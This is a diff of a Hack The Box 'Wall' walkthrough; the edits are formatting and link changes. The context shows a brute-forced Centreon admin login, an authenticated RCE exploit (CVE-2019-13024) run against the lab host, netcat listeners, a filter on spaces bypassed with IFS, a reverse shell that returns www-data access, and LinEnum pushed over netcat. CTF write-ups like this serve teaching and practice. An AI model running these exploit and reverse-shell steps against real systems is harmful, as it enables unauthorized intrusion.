@@ -220,7 +220,7 @@ Trying : password1
 ```
 There we go, usernmae **admin** password **password1**. This kinda feels kinda bad because we should have been able to guess this, but oh well. Learned a way to brutefoce with a CSRF token I gues.
 
-So now that we have credentials, we can pivot back to that authenticated RCE [CVE-2019-13024](https://github.com/mhaskar/CVE-2019-13024/blob/master/Centreon-exploit.py)
+So now that we have credentials, we can pivot back to that authenticated RCE [CVE-2019-13024](https://github.com/mhaskar/CVE-2019-13024/blob/master/Centreon-exploit.py):
 
 ```python
 #!/usr/bin/python
@@ -329,11 +329,12 @@ So let's build our command again. In looking above we need a url, username, pass
 
 ```python 47069.py http://10.10.10.157/centreon admin password1 10.10.14.75 42069```
 
-and start our listener:
+Start our listener:
 ```console
 root@endeavour:~/htb/wall# nc -lvnp 42069
 listening on [any] 42069 ..
 ```
+and trigger the exploit:
 
 ```console
 root@endeavour:~/htb/wall# python 47069.py http://10.10.10.157/centreon admin password1 10.10.14.75 42069
@@ -356,7 +357,7 @@ The code that caused this warning is on line 56 of the file 47069.py. To get rid
 [+] Check your netcat listener !
 ```
 
-Nothing showed up on our listener. Let's debug a little and see what is happening, why is it failing?
+Nothing showed up on our listener. Let's debug a little using [strace](http://man7.org/linux/man-pages/man1/strace.1.html) and see what is happening, why is it failing?
 
 ```console
 root@endeavour:~/htb/wall# cat strace.txt |grep "sendto\|recvfrom"
@@ -375,7 +376,7 @@ sendto(3, "POST /centreon/include/configura"..., 359, 0, NULL, 0) = 359
 recvfrom(3, "HTTP/1.1 200 OK\r\nDate: Thu, 03 O"..., 8192, 0, NULL, NULL) = 633
 ```
 
-We appear to be getting 403'd right after our POST to /centreon/main.get.php?p=60
+We appear to be getting **403**'d right after our `POST` to `/centreon/main.get.php?p=60`.
 
 ```console
 root@endeavour:~/htb/wall# cat strace.txt |grep -C 5 "Forbidden"
@@ -392,7 +393,7 @@ stat("/root/_netrc", 0x7ffd8a6299c0)    = -1 ENOENT (No such file or directory)
 poll([{fd=3, events=POLLIN}], 1, 0)     = 0 (Timeout)
 ```
 
-So I spent an awful long time right here. In trying to figure out why the exploit wasn't working I realized that creator of the box is conveniently the author of the exploit I was trying to execute -- Askar (@mohammadaskar2) -- I suppose he did not want it to be so easy to execute. In taking a look into the centreon config GUI (since we had the admin username and password and could log in) I located the field that we were getting 403'd on.
+So I spent an awful long time right here. In trying to figure out why the exploit wasn't working I realized that creator of the box is conveniently the author of the exploit I was trying to execute -- Askar [@mohammadaskar2](https://twitter.com/mohammadaskar2?lang=en) -- I suppose he did not want it to be so easy to execute. In taking a look into the centreon config GUI (since we had the admin username and password and could log in) I located the field that we were getting 403'd on.
 
 ![Centreon Config](./images/centreon_misc.png)
 **Figure 3:** Centreon Config
@@ -401,7 +402,7 @@ Playing around with this, I realized that there were certain characters that wou
 
 Space is one of the characters that was explcitly disallowed. How do we get around this? Well - the Internal Field Seperator is the tool for this job.
 
-First let's create a reverse shell called shell.sh:
+First let's create a reverse shell called `shell.sh`:
 
 ```console
 #!/bin/bash
@@ -428,7 +429,7 @@ Sweet - so who are we?
 
 ```uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)```
 
-In poking around, we do not have enough rights to get to the user flag. But I am able to get linenum over:
+In poking around, we do not have enough rights to get to the user flag. But I am able to get [linenum](https://github.com/rebootuser/LinEnum) over:
 
 ```console
 root@endeavour:~/htb/wall# nc -lvnp 42069 < linenum.sh
